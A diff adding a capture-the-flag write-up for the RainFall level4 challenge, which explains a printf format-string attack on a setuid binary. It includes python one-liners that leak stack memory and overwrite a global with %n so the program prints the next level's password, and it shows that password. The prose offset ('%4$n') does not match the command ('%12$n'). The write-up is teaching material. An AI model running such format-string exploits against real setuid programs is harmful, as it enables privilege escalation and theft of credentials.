@@ -1,0 +1,22 @@
+There is a setuid binary "level4" own by level5
+
+After disassembling the binary we can see that main() function call function n()
+which call system() with "/bin/cat /home/user/level5/.pass"
+only if the uninitialised global located at [0x8049810] equal 16930116.
+
+Here again the vulnerability resides in the printf() call
+as user can set the format string to write into variable
+This is a Format String Attack
+
+The printf() call was moved to a sub-function but it has no impact on the attack
+
+We need to print the memory until we reach the address of the variable we want to change
+
+level4@RainFall:~$> python -c 'print "\x10\x98\x04\x08" + " %x" * 13' | ./level4
+ b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 8049810 20782520
+
+So we need to modify the twelfth one to 16930116 with "%16930112x" + "%4$n"
+here it's 16930112 because we already have four bytes printed with the address
+
+level4@RainFall:~$> python -c 'print "\x10\x98\x04\x08" + "%16930112x" + "%12$n"' | ./level4
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
